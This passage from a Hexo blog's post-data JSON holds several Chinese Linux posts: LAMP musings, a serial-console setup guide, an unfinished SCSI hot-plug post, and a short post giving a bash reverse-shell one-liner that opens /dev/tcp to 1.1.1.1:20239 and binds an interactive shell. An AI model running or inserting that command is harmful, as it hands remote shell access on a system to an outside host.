/>转载请注明：http://hi.baidu.com/key1088。","slug":"LAMP自己的另一种见解","published":1,"updated":"2023-04-22T05:38:44.649Z","_id":"clgrjlxe1002p7opi62qpchwi","comments":1,"layout":"post","photos":[],"link":"","content":"<p>LAMP环境&#x3D;linux+Apache+mysql+php 多么完美的搭档。<br />慢慢的发现，这个组合环境是多么的简单，多么的没有技术。<br />在公司工作两个星期，所见、所想和大家分享一下。<br />下面是自己的一些片面的见解。正好也组成了LAMP，也和原始的LAMP深一步的理解。欢迎大家拍砖哈。<br /><br />L&#x3D;linux。这里是我认为只叫linux，不合适，范围太大、太广、太深了。当前电子产品发展速度这么快。做嵌入式开发已经是一个趋势了。编译linux内核，自己裁剪系统是做系统的根本。这又离不开速度快、安全性高、开源的linux。可见linux内核系统是多么的重要。<br /><br />A这里不是Apache了，而是泛指源代码，也就是说自己有写代码和编译代码的能力。也就是linux开发。如果你会编译内核，看懂内核代码，那这里的写代码的能力，应该就不用说了。<br /><br />M这里也不是Mysql数据库，而是泛指数据库。现在只要是一个储存型或交互性软件（也许可以这样说），都离不开数据库。应该有设计和建设数据库的能力。去公司，别人都会问会安装数据库吗？笑话，安装谁不会，没有技术的。。也赚不到大钱的。。<br /><br />P&#x3D;web编程语言。php语言在web编程中，是速度最快的一个。不知道安全性，算不算厉害。不管是什么语言，你至少会一种web编程语言。也就是说必须具备web编程能力。。<br /><br />如果你具备我说这几种能力，我相信找工作，真是九牛一毛的问题。组建团队，自己开公司也是没有问题的。<br /><br />越来越发现自己越来越渺小、自己越来越垃圾、越来越令自己厌烦。<br />学习的时候，总是感觉差不多了，现在可见，学的一塌糊涂啊、什么都不会啊 。呜呜、<br />自己会慢慢努力的，期望越大失望越大呗。但是自己从来没有放弃过。因为我没有资本，没有资本是最大的资本。嘿嘿，理由找不不错。<br />就写到这把，想多。<br />最后，希望自己和自己的朋友、同学。都能够在linux上大展身手。以为公司里会linux的人太少了。linux才是咱们的资本、自学更是资本。<br /><br />转载请注明：<a href=\"http://hi.baidu.com/key1088%E3%80%82\">http://hi.baidu.com/key1088。</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>LAMP环境&#x3D;linux+Apache+mysql+php 多么完美的搭档。<br />慢慢的发现，这个组合环境是多么的简单，多么的没有技术。<br />在公司工作两个星期，所见、所想和大家分享一下。<br />下面是自己的一些片面的见解。正好也组成了LAMP，也和原始的LAMP深一步的理解。欢迎大家拍砖哈。<br /><br />L&#x3D;linux。这里是我认为只叫linux，不合适，范围太大、太广、太深了。当前电子产品发展速度这么快。做嵌入式开发已经是一个趋势了。编译linux内核，自己裁剪系统是做系统的根本。这又离不开速度快、安全性高、开源的linux。可见linux内核系统是多么的重要。<br /><br />A这里不是Apache了，而是泛指源代码，也就是说自己有写代码和编译代码的能力。也就是linux开发。如果你会编译内核，看懂内核代码，那这里的写代码的能力，应该就不用说了。<br /><br />M这里也不是Mysql数据库，而是泛指数据库。现在只要是一个储存型或交互性软件（也许可以这样说），都离不开数据库。应该有设计和建设数据库的能力。去公司，别人都会问会安装数据库吗？笑话，安装谁不会，没有技术的。。也赚不到大钱的。。<br /><br />P&#x3D;web编程语言。php语言在web编程中，是速度最快的一个。不知道安全性，算不算厉害。不管是什么语言，你至少会一种web编程语言。也就是说必须具备web编程能力。。<br /><br />如果你具备我说这几种能力，我相信找工作，真是九牛一毛的问题。组建团队，自己开公司也是没有问题的。<br /><br />越来越发现自己越来越渺小、自己越来越垃圾、越来越令自己厌烦。<br />学习的时候，总是感觉差不多了，现在可见，学的一塌糊涂啊、什么都不会啊 。呜呜、<br />自己会慢慢努力的，期望越大失望越大呗。但是自己从来没有放弃过。因为我没有资本，没有资本是最大的资本。嘿嘿，理由找不不错。<br />就写到这把，想多。<br />最后，希望自己和自己的朋友、同学。都能够在linux上大展身手。以为公司里会linux的人太少了。linux才是咱们的资本、自学更是资本。<br /><br />转载请注明：<a href=\"http://hi.baidu.com/key1088%E3%80%82\">http://hi.baidu.com/key1088。</a></p>\n"},{"title":"linux console的利用","date":"2011-01-19T09:12:00.000Z","_content":"<p>公司linux设备出现问题的时候，网络不同，没有办法操作。有的代理商，配置的ip都记不住，设备没有恢复出厂设备按钮。</p><p>以前只能接显示器，有的还要打开机箱盖，NND的麻烦啊。</p><p>&nbsp;</p><p>所以啊，想了一个办法，像配置交换机一样。使用console口，连接。配置。</p><p>开始网络寻找，找到了方法，给童鞋们分享一下。</p><p>&nbsp;</p><p>1.grup的配置/boot/grub/grub.conf</p><p># grub.conf generated by anaconda<br />#<br /># Note that you do not have to rerun grub after making changes to this file<br /># NOTICE:&nbsp; You do not have a /boot partition.&nbsp; This means that<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; all kernel and initrd paths are relative to /, eg.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd1,0)<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-version ro root=/dev/sdb1<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-version.img<br />#boot=/dev/sda<br />serial --unit=0 --speed=9600 --word=8 --parity=no --stop=1&nbsp;<br />terminal --timeout=10 serial console<br />default=0<br />timeout=5<br />#splashimage=(hd0,0)/boot/grub/splash.xpm.gz&nbsp;&nbsp;&nbsp;&nbsp; ####图像建议去掉<br />hiddenmenu<br />title Fedora Core (2.6.11-1.1369_FC4)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd0,0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/1 console=tty0 console=ttyS0,9600n8<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-2.6.11-1.1369_FC4.img</p><p>&nbsp;</p><p>console在linux下是字符设备。ttys0.ttys1,ttys2......&nbsp; </p><p>tty0 是linux没有启动起来的时候，内核对应的接口（我自己理解是这样）</p><p>ttys0，则是linux console 的表示。</p><p>&nbsp;</p><p>2.修改/etc/inittab</p><p>[root@localhost etc]# cat /etc/inittab<br />#<br /># inittab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This file describes how the INIT process should set up<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the system in a certain run-level.<br />#<br /># Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Miquel van Smoorenburg, &lt;&gt;<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Modified for RHS Linux by Marc Ewing and Donnie Barnes<br />#</p><p># Default runlevel. The runlevels used by RHS are:<br />#&nbsp;&nbsp; 0 - halt (Do NOT set initdefault to this)<br />#&nbsp;&nbsp; 1 - Single user mode<br />#&nbsp;&nbsp; 2 - Multiuser, without NFS (The same as 3, if you do not have networking)<br />#&nbsp;&nbsp; 3 - Full multiuser mode<br />#&nbsp;&nbsp; 4 - unused<br />#&nbsp;&nbsp; 5 - X11<br />#&nbsp;&nbsp; 6 - reboot (Do NOT set initdefault to this)<br />#<br />id:3:initdefault:</p><p># System initialization.<br />si::sysinit:/etc/rc.d/rc.sysinit</p><p>l0:0:wait:/etc/rc.d/rc 0<br />l1:1:wait:/etc/rc.d/rc 1<br />l2:2:wait:/etc/rc.d/rc 2<br />l3:3:wait:/etc/rc.d/rc 3<br />l4:4:wait:/etc/rc.d/rc 4<br />l5:5:wait:/etc/rc.d/rc 5<br />l6:6:wait:/etc/rc.d/rc 6</p><p># Trap CTRL-ALT-DELETE<br />ca::ctrlaltdel:/sbin/shutdown -t3 -r now</p><p># When our UPS tells us power has failed, assume we have a few minutes<br /># of power left.&nbsp; Schedule a shutdown for 2 minutes from now.<br /># This does, of course, assume you have powerd installed and your<br /># UPS connected and working correctly.<br />pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;</p><p># If power was restored before the shutdown kicked in, cancel it.<br />pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;</p><p><br /># Run gettys in standard runlevels<br />co:2345:respawn:/sbin/agetty ttyS0 9600 vt100-nav<br />1:2345:respawn:/sbin/mingetty tty1<br />2:2345:respawn:/sbin/mingetty tty2<br />3:2345:respawn:/sbin/mingetty tty3<br />4:2345:respawn:/sbin/mingetty tty4<br />5:2345:respawn:/sbin/mingetty tty5<br />6:2345:respawn:/sbin/mingetty tty6<br />s0:2345:respawn:/sbin/agetty -L -f /etc/issue.serial 9600 ttyS1 vt100</p><p><br /># Run xdm in runlevel 5<br />x:5:once:/etc/X11/prefdm -nodaemon<br />3. 修改/etc/securetty</p><p>tty安全设置，系统允许ttys0登录。添加ttyS0</p><p>[root@localhost etc]# cat /etc/securetty<br />console<br />vc/1<br />vc/2<br />vc/3<br />vc/4<br />vc/5<br />vc/6<br />vc/7<br />vc/8<br />vc/9<br />vc/10<br />vc/11<br />tty1<br />tty2<br />tty3<br />tty4<br />tty5<br />tty6<br />tty7<br />tty8<br />tty9<br />tty10<br />tty11<br />ttyS0<br /></p><p>然后用重启用putty或者SecureCRT。不建议用系统的超级终端，因为编辑文件的时候，无法编辑。</p><p>至少我没有找到方法。</p><p>我用的是putty</p><p><img src=\"/images/pic/3e38309389d3fcdda877a43a.jpg\" small=\"0\" /></p><p>ok 不懂的 童鞋可以留言。 加QQ交流。欢迎拍砖。。。<br /></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>","source":"_posts/linux-console的利用.md","raw":"title: linux console的利用\ncategories: [Linux]\ntags: []\ndate: 2011-01-19 17:12:00\n---\n<p>公司linux设备出现问题的时候，网络不同，没有办法操作。有的代理商，配置的ip都记不住，设备没有恢复出厂设备按钮。</p><p>以前只能接显示器，有的还要打开机箱盖，NND的麻烦啊。</p><p>&nbsp;</p><p>所以啊，想了一个办法，像配置交换机一样。使用console口，连接。配置。</p><p>开始网络寻找，找到了方法，给童鞋们分享一下。</p><p>&nbsp;</p><p>1.grup的配置/boot/grub/grub.conf</p><p># grub.conf generated by anaconda<br />#<br /># Note that you do not have to rerun grub after making changes to this file<br /># NOTICE:&nbsp; You do not have a /boot partition.&nbsp; This means that<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; all kernel and initrd paths are relative to /, eg.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd1,0)<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-version ro root=/dev/sdb1<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-version.img<br />#boot=/dev/sda<br />serial --unit=0 --speed=9600 --word=8 --parity=no --stop=1&nbsp;<br />terminal --timeout=10 serial console<br />default=0<br />timeout=5<br />#splashimage=(hd0,0)/boot/grub/splash.xpm.gz&nbsp;&nbsp;&nbsp;&nbsp; ####图像建议去掉<br />hiddenmenu<br />title Fedora Core (2.6.11-1.1369_FC4)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd0,0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/1 console=tty0 console=ttyS0,9600n8<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-2.6.11-1.1369_FC4.img</p><p>&nbsp;</p><p>console在linux下是字符设备。ttys0.ttys1,ttys2......&nbsp; </p><p>tty0 是linux没有启动起来的时候，内核对应的接口（我自己理解是这样）</p><p>ttys0，则是linux console 的表示。</p><p>&nbsp;</p><p>2.修改/etc/inittab</p><p>[root@localhost etc]# cat /etc/inittab<br />#<br /># inittab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This file describes how the INIT process should set up<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the system in a certain run-level.<br />#<br /># Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Miquel van Smoorenburg, &lt;&gt;<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Modified for RHS Linux by Marc Ewing and Donnie Barnes<br />#</p><p># Default runlevel. The runlevels used by RHS are:<br />#&nbsp;&nbsp; 0 - halt (Do NOT set initdefault to this)<br />#&nbsp;&nbsp; 1 - Single user mode<br />#&nbsp;&nbsp; 2 - Multiuser, without NFS (The same as 3, if you do not have networking)<br />#&nbsp;&nbsp; 3 - Full multiuser mode<br />#&nbsp;&nbsp; 4 - unused<br />#&nbsp;&nbsp; 5 - X11<br />#&nbsp;&nbsp; 6 - reboot (Do NOT set initdefault to this)<br />#<br />id:3:initdefault:</p><p># System initialization.<br />si::sysinit:/etc/rc.d/rc.sysinit</p><p>l0:0:wait:/etc/rc.d/rc 0<br />l1:1:wait:/etc/rc.d/rc 1<br />l2:2:wait:/etc/rc.d/rc 2<br />l3:3:wait:/etc/rc.d/rc 3<br />l4:4:wait:/etc/rc.d/rc 4<br />l5:5:wait:/etc/rc.d/rc 5<br />l6:6:wait:/etc/rc.d/rc 6</p><p># Trap CTRL-ALT-DELETE<br />ca::ctrlaltdel:/sbin/shutdown -t3 -r now</p><p># When our UPS tells us power has failed, assume we have a few minutes<br /># of power left.&nbsp; Schedule a shutdown for 2 minutes from now.<br /># This does, of course, assume you have powerd installed and your<br /># UPS connected and working correctly.<br />pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;</p><p># If power was restored before the shutdown kicked in, cancel it.<br />pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;</p><p><br /># Run gettys in standard runlevels<br />co:2345:respawn:/sbin/agetty ttyS0 9600 vt100-nav<br />1:2345:respawn:/sbin/mingetty tty1<br />2:2345:respawn:/sbin/mingetty tty2<br />3:2345:respawn:/sbin/mingetty tty3<br />4:2345:respawn:/sbin/mingetty tty4<br />5:2345:respawn:/sbin/mingetty tty5<br />6:2345:respawn:/sbin/mingetty tty6<br />s0:2345:respawn:/sbin/agetty -L -f /etc/issue.serial 9600 ttyS1 vt100</p><p><br /># Run xdm in runlevel 5<br />x:5:once:/etc/X11/prefdm -nodaemon<br />3. 修改/etc/securetty</p><p>tty安全设置，系统允许ttys0登录。添加ttyS0</p><p>[root@localhost etc]# cat /etc/securetty<br />console<br />vc/1<br />vc/2<br />vc/3<br />vc/4<br />vc/5<br />vc/6<br />vc/7<br />vc/8<br />vc/9<br />vc/10<br />vc/11<br />tty1<br />tty2<br />tty3<br />tty4<br />tty5<br />tty6<br />tty7<br />tty8<br />tty9<br />tty10<br />tty11<br />ttyS0<br /></p><p>然后用重启用putty或者SecureCRT。不建议用系统的超级终端，因为编辑文件的时候，无法编辑。</p><p>至少我没有找到方法。</p><p>我用的是putty</p><p><img src=\"/images/pic/3e38309389d3fcdda877a43a.jpg\" small=\"0\" /></p><p>ok 不懂的 童鞋可以留言。 加QQ交流。欢迎拍砖。。。<br /></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>","slug":"linux-console的利用","published":1,"updated":"2023-04-22T05:38:44.780Z","_id":"clgrjlxfs002w7opi2yibcz53","comments":1,"layout":"post","photos":[],"link":"","content":"<p>公司linux设备出现问题的时候，网络不同，没有办法操作。有的代理商，配置的ip都记不住，设备没有恢复出厂设备按钮。</p><p>以前只能接显示器，有的还要打开机箱盖，NND的麻烦啊。</p><p>&nbsp;</p><p>所以啊，想了一个办法，像配置交换机一样。使用console口，连接。配置。</p><p>开始网络寻找，找到了方法，给童鞋们分享一下。</p><p>&nbsp;</p><p>1.grup的配置/boot/grub/grub.conf</p><p># grub.conf generated by anaconda<br />#<br /># Note that you do not have to rerun grub after making changes to this file<br /># NOTICE:&nbsp; You do not have a /boot partition.&nbsp; This means that<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; all kernel and initrd paths are relative to /, eg.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd1,0)<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-version ro root=/dev/sdb1<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-version.img<br />#boot=/dev/sda<br />serial --unit=0 --speed=9600 --word=8 --parity=no --stop=1&nbsp;<br />terminal --timeout=10 serial console<br />default=0<br />timeout=5<br />#splashimage=(hd0,0)/boot/grub/splash.xpm.gz&nbsp;&nbsp;&nbsp;&nbsp; ####图像建议去掉<br />hiddenmenu<br />title Fedora Core (2.6.11-1.1369_FC4)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd0,0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/1 console=tty0 console=ttyS0,9600n8<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-2.6.11-1.1369_FC4.img</p><p>&nbsp;</p><p>console在linux下是字符设备。ttys0.ttys1,ttys2......&nbsp; </p><p>tty0 是linux没有启动起来的时候，内核对应的接口（我自己理解是这样）</p><p>ttys0，则是linux console 的表示。</p><p>&nbsp;</p><p>2.修改/etc/inittab</p><p>[root@localhost etc]# cat /etc/inittab<br />#<br /># inittab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This file describes how the INIT process should set up<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the system in a certain run-level.<br />#<br /># Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Miquel van Smoorenburg, &lt;&gt;<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Modified for RHS Linux by Marc Ewing and Donnie Barnes<br />#</p><p># Default runlevel. The runlevels used by RHS are:<br />#&nbsp;&nbsp; 0 - halt (Do NOT set initdefault to this)<br />#&nbsp;&nbsp; 1 - Single user mode<br />#&nbsp;&nbsp; 2 - Multiuser, without NFS (The same as 3, if you do not have networking)<br />#&nbsp;&nbsp; 3 - Full multiuser mode<br />#&nbsp;&nbsp; 4 - unused<br />#&nbsp;&nbsp; 5 - X11<br />#&nbsp;&nbsp; 6 - reboot (Do NOT set initdefault to this)<br />#<br />id:3:initdefault:</p><p># System initialization.<br />si::sysinit:/etc/rc.d/rc.sysinit</p><p>l0:0:wait:/etc/rc.d/rc 0<br />l1:1:wait:/etc/rc.d/rc 1<br />l2:2:wait:/etc/rc.d/rc 2<br />l3:3:wait:/etc/rc.d/rc 3<br />l4:4:wait:/etc/rc.d/rc 4<br />l5:5:wait:/etc/rc.d/rc 5<br />l6:6:wait:/etc/rc.d/rc 6</p><p># Trap CTRL-ALT-DELETE<br />ca::ctrlaltdel:/sbin/shutdown -t3 -r now</p><p># When our UPS tells us power has failed, assume we have a few minutes<br /># of power left.&nbsp; Schedule a shutdown for 2 minutes from now.<br /># This does, of course, assume you have powerd installed and your<br /># UPS connected and working correctly.<br />pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;</p><p># If power was restored before the shutdown kicked in, cancel it.<br />pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;</p><p><br /># Run gettys in standard runlevels<br />co:2345:respawn:/sbin/agetty ttyS0 9600 vt100-nav<br />1:2345:respawn:/sbin/mingetty tty1<br />2:2345:respawn:/sbin/mingetty tty2<br />3:2345:respawn:/sbin/mingetty tty3<br />4:2345:respawn:/sbin/mingetty tty4<br />5:2345:respawn:/sbin/mingetty tty5<br />6:2345:respawn:/sbin/mingetty tty6<br />s0:2345:respawn:/sbin/agetty -L -f /etc/issue.serial 9600 ttyS1 vt100</p><p><br /># Run xdm in runlevel 5<br />x:5:once:/etc/X11/prefdm -nodaemon<br />3. 修改/etc/securetty</p><p>tty安全设置，系统允许ttys0登录。添加ttyS0</p><p>[root@localhost etc]# cat /etc/securetty<br />console<br />vc/1<br />vc/2<br />vc/3<br />vc/4<br />vc/5<br />vc/6<br />vc/7<br />vc/8<br />vc/9<br />vc/10<br />vc/11<br />tty1<br />tty2<br />tty3<br />tty4<br />tty5<br />tty6<br />tty7<br />tty8<br />tty9<br />tty10<br />tty11<br />ttyS0<br /></p><p>然后用重启用putty或者SecureCRT。不建议用系统的超级终端，因为编辑文件的时候，无法编辑。</p><p>至少我没有找到方法。</p><p>我用的是putty</p><p><img src=\"/images/pic/3e38309389d3fcdda877a43a.jpg\" small=\"0\" /></p><p>ok 不懂的 童鞋可以留言。 加QQ交流。欢迎拍砖。。。<br /></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>公司linux设备出现问题的时候，网络不同，没有办法操作。有的代理商，配置的ip都记不住，设备没有恢复出厂设备按钮。</p><p>以前只能接显示器，有的还要打开机箱盖，NND的麻烦啊。</p><p>&nbsp;</p><p>所以啊，想了一个办法，像配置交换机一样。使用console口，连接。配置。</p><p>开始网络寻找，找到了方法，给童鞋们分享一下。</p><p>&nbsp;</p><p>1.grup的配置/boot/grub/grub.conf</p><p># grub.conf generated by anaconda<br />#<br /># Note that you do not have to rerun grub after making changes to this file<br /># NOTICE:&nbsp; You do not have a /boot partition.&nbsp; This means that<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; all kernel and initrd paths are relative to /, eg.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd1,0)<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-version ro root=/dev/sdb1<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-version.img<br />#boot=/dev/sda<br />serial --unit=0 --speed=9600 --word=8 --parity=no --stop=1&nbsp;<br />terminal --timeout=10 serial console<br />default=0<br />timeout=5<br />#splashimage=(hd0,0)/boot/grub/splash.xpm.gz&nbsp;&nbsp;&nbsp;&nbsp; ####图像建议去掉<br />hiddenmenu<br />title Fedora Core (2.6.11-1.1369_FC4)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root (hd0,0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/1 console=tty0 console=ttyS0,9600n8<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initrd /boot/initrd-2.6.11-1.1369_FC4.img</p><p>&nbsp;</p><p>console在linux下是字符设备。ttys0.ttys1,ttys2......&nbsp; </p><p>tty0 是linux没有启动起来的时候，内核对应的接口（我自己理解是这样）</p><p>ttys0，则是linux console 的表示。</p><p>&nbsp;</p><p>2.修改/etc/inittab</p><p>[root@localhost etc]# cat /etc/inittab<br />#<br /># inittab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This file describes how the INIT process should set up<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the system in a certain run-level.<br />#<br /># Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Miquel van Smoorenburg, &lt;&gt;<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Modified for RHS Linux by Marc Ewing and Donnie Barnes<br />#</p><p># Default runlevel. The runlevels used by RHS are:<br />#&nbsp;&nbsp; 0 - halt (Do NOT set initdefault to this)<br />#&nbsp;&nbsp; 1 - Single user mode<br />#&nbsp;&nbsp; 2 - Multiuser, without NFS (The same as 3, if you do not have networking)<br />#&nbsp;&nbsp; 3 - Full multiuser mode<br />#&nbsp;&nbsp; 4 - unused<br />#&nbsp;&nbsp; 5 - X11<br />#&nbsp;&nbsp; 6 - reboot (Do NOT set initdefault to this)<br />#<br />id:3:initdefault:</p><p># System initialization.<br />si::sysinit:/etc/rc.d/rc.sysinit</p><p>l0:0:wait:/etc/rc.d/rc 0<br />l1:1:wait:/etc/rc.d/rc 1<br />l2:2:wait:/etc/rc.d/rc 2<br />l3:3:wait:/etc/rc.d/rc 3<br />l4:4:wait:/etc/rc.d/rc 4<br />l5:5:wait:/etc/rc.d/rc 5<br />l6:6:wait:/etc/rc.d/rc 6</p><p># Trap CTRL-ALT-DELETE<br />ca::ctrlaltdel:/sbin/shutdown -t3 -r now</p><p># When our UPS tells us power has failed, assume we have a few minutes<br /># of power left.&nbsp; Schedule a shutdown for 2 minutes from now.<br /># This does, of course, assume you have powerd installed and your<br /># UPS connected and working correctly.<br />pf::powerfail:/sbin/shutdown -f -h +2 &quot;Power Failure; System Shutting Down&quot;</p><p># If power was restored before the shutdown kicked in, cancel it.<br />pr:12345:powerokwait:/sbin/shutdown -c &quot;Power Restored; Shutdown Cancelled&quot;</p><p><br /># Run gettys in standard runlevels<br />co:2345:respawn:/sbin/agetty ttyS0 9600 vt100-nav<br />1:2345:respawn:/sbin/mingetty tty1<br />2:2345:respawn:/sbin/mingetty tty2<br />3:2345:respawn:/sbin/mingetty tty3<br />4:2345:respawn:/sbin/mingetty tty4<br />5:2345:respawn:/sbin/mingetty tty5<br />6:2345:respawn:/sbin/mingetty tty6<br />s0:2345:respawn:/sbin/agetty -L -f /etc/issue.serial 9600 ttyS1 vt100</p><p><br /># Run xdm in runlevel 5<br />x:5:once:/etc/X11/prefdm -nodaemon<br />3. 修改/etc/securetty</p><p>tty安全设置，系统允许ttys0登录。添加ttyS0</p><p>[root@localhost etc]# cat /etc/securetty<br />console<br />vc/1<br />vc/2<br />vc/3<br />vc/4<br />vc/5<br />vc/6<br />vc/7<br />vc/8<br />vc/9<br />vc/10<br />vc/11<br />tty1<br />tty2<br />tty3<br />tty4<br />tty5<br />tty6<br />tty7<br />tty8<br />tty9<br />tty10<br />tty11<br />ttyS0<br /></p><p>然后用重启用putty或者SecureCRT。不建议用系统的超级终端，因为编辑文件的时候，无法编辑。</p><p>至少我没有找到方法。</p><p>我用的是putty</p><p><img src=\"/images/pic/3e38309389d3fcdda877a43a.jpg\" small=\"0\" /></p><p>ok 不懂的 童鞋可以留言。 加QQ交流。欢迎拍砖。。。<br /></p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p>"},{"title":"linux shell下命令反弹shell，tcp连接","date":"2016-08-24T13:45:01.000Z","_content":"<pre>\nexec 9<> /dev/tcp/1.1.1.1/20239;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i\n</pre>","source":"_posts/linux-shell下命令反弹shell，tcp连接.md","raw":"title: linux shell下命令反弹shell，tcp连接\ncategories: [网络安全,Linux]\ntags: []\ndate: 2016-08-24 21:45:01\n---\n<pre>\nexec 9<> /dev/tcp/1.1.1.1/20239;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i\n</pre>","slug":"linux-shell下命令反弹shell，tcp连接","published":1,"updated":"2023-04-22T05:38:44.787Z","_id":"clgrjlxfx002x7opi1z36bamm","comments":1,"layout":"post","photos":[],"link":"","content":"<pre>\nexec 9<> /dev/tcp/1.1.1.1/20239;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i\n</pre>","site":{"data":{}},"excerpt":"","more":"<pre>\nexec 9<> /dev/tcp/1.1.1.1/20239;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i\n</pre>"},{"title":"linux scsi硬盘热插拔","date":"2011-11-01T02:15:00.000Z","_content":"<p>在生产环境中，有很多情况不能随便重启设备，例如scsi硬盘的更换（非raid卡环境）。</p><p>在linux下面修改/proc/scsi/scsi文件可以实现热插拔。</p><p>&nbsp;</p><p>测试环境red hat 5.5+vmware8.0</p><p>具体步骤：</p><p>1.硬盘添加到服务上，看好接口，插槽。</p><p>2.管理员登陆，看一个/proc/scsi/scsi文件</p><p><img small=\"0\" src=\"/images/pic/2a0d2381df82dbd70cf4d283.jpg\" /><br 